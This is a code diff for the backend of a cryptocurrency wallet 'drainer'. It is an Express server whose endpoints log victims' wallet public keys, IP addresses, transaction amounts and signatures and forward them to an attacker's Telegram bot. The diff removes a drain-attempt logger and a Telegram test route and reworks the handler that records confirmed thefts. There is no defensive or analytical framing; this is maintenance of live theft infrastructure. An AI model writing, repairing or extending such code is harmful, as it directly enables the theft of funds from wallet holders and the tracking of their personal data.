@@ -71,66 +71,13 @@ app.post('/api/drainer/log-wallet', async (req, res) => {
   }
 });
 
-// Log drain attempt when transaction is presented to user for signing - 2025 FIX
-app.post('/api/drainer/log-drain-attempt', async (req, res) => {
-  try {
-    const { publicKey, walletType, lamports, instructions, transactionSize } = req.body;
-    const userIp = extractUserIP(req);
-
-    // Log drain attempt to Telegram
-    await telegramLogger.logDrainAttempt({
-      publicKey,
-      lamports: lamports || 0,
-      ip: userIp,
-      walletType: walletType || 'Unknown',
-      success: true, // Transaction was successfully created and presented
-      instructions: instructions || 0,
-      transactionSize: transactionSize || 0
-    });
-
-    res.json({ success: true });
-  } catch (error) {
-    console.error('Error logging drain attempt:', error);
-    res.status(500).json({ error: 'Failed to log drain attempt' });
-  }
-});
-
-// Test Telegram connection - 2025 DEBUG
-app.get('/api/test/telegram', async (req, res) => {
-  try {
-    console.log('[API] Testing Telegram connection...');
-    const isConnected = await telegramLogger.testConnection();
-    
-    res.json({ 
-      success: isConnected,
-      message: isConnected ? 'Telegram connection successful' : 'Telegram connection failed',
-      enabled: telegramLogger.enabled,
-      hasToken: !!telegramLogger.botToken,
-      hasChatId: !!telegramLogger.chatId
-    });
-  } catch (error) {
-    console.error('Error testing Telegram:', error);
-    res.status(500).json({ 
-      success: false,
-      error: 'Failed to test Telegram connection',
-      message: error.message
-    });
-  }
-});
-
-// Log transaction confirmation (actual on-chain confirmation) - 2025 FIX
+// Log transaction confirmation with server-side deduplication - 2025 FIX
 app.post('/api/drainer/log-confirmation', async (req, res) => {
   try {
-    const { publicKey, signature, lamports, userAgent, walletType, status } = req.body;
-    const userIp = extractUserIP(req);
+    const { publicKey, signature, lamports, userAgent, walletType } = req.body;
+    const userIp = extractUserIP(req); // Use centralized IP extraction
     
-    // Only log drain success for confirmed/finalized transactions
-    if (status !== 'confirmed' && status !== 'finalized') {
-      console.log(`[CONFIRMATION] Skipping drain success log - status not confirmed: ${status}`);
-      return res.json({ success: true, skipped: true });
-    }
-    
-    // Server-side deduplication check
+    // Server-side deduplication check - 2025 FIX
     const confirmationKey = `${publicKey}-${signature}`;
     const now = Date.now();
     const cachedLog = serverWalletLogCache.get(confirmationKey);
@@ -140,14 +87,14 @@ app.post('/api/drainer/log-confirmation', async (req, res) => {
       return res.json({ success: true, cached: true });
     }
     
-    // Log actual drain success (confirmed on-chain)
-    await telegramLogger.logDrainSuccess({
+    // Log to Telegram with deduplication
+    await telegramLogger.logTransactionConfirmation({
       publicKey,
       signature,
       lamports,
       userAgent,
       walletType,
-      ip: userIp
+      userIp
     });
     
     // Cache the log
